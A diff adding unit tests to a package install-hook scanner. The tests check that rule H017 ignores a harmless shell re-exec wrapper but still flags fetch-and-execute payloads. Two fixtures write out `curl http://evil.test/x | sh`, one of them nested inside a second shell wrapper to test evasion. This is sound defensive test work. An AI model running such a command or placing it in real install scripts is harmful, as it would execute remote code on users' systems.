@@ -186,3 +186,47 @@ def test_manifest_scan_stays_silent_on_benign_scriptlets(text):
     assert scan_tree_manifest(
         [("PKGBUILD", b"pkgname=x\n"), ("x.install", text.encode())],
         [], "x") == []
+
+
+# --- Literal shell re-exec wrappers (trowel-bin) --------------------------
+# Debian packaging templates wrap every hook body in a shell re-exec,
+# `/bin/sh -c '<body>' -- "$@"`.  H017 is line-based and read the wrapper
+# token as the executed payload, so a hook that only `exit 0`/`systemctl …`
+# scored as fetch-or-execute.  The fix unwraps the literal and scans the
+# inner body; a fetch or a dynamic argument still fires.
+
+def _install_diff(text: str) -> str:
+    lines = text.splitlines()
+    return ("--- a/x.install\n+++ b/x.install\n@@ -1,%d +1,%d @@\n"
+            % (len(lines), len(lines))
+            + "".join("+" + line + "\n" for line in lines))
+
+
+def test_h017_does_not_read_a_benign_reexec_wrapper_as_fetch_or_execute():
+    assert "H017" not in _ids(_install_diff(
+        "pre_install() {\n"
+        "  /bin/sh -c '#!/bin/sh\n"
+        "set -eu\n"
+        "# Nothing to prepare.\n"
+        "exit 0\n"
+        "' -- \"$@\"\n"
+        "}\n"
+    ))
+
+
+def test_h017_still_fires_high_on_a_fetch_inside_a_literal_wrapper():
+    diff = _install_diff(
+        "post_install() {\n"
+        "  sh -c 'curl http://evil.test/x | sh'\n"
+        "}\n"
+    )
+    assert "H017" in _ids(diff)
+
+
+def test_h017_fires_on_a_nested_reexec_wrapper():
+    diff = _install_diff(
+        "post_install() {\n"
+        "  sh -c 'sh -c \"curl http://evil.test/x | sh\"'\n"
+        "}\n"
+    )
+    assert "H017" in _ids(diff)
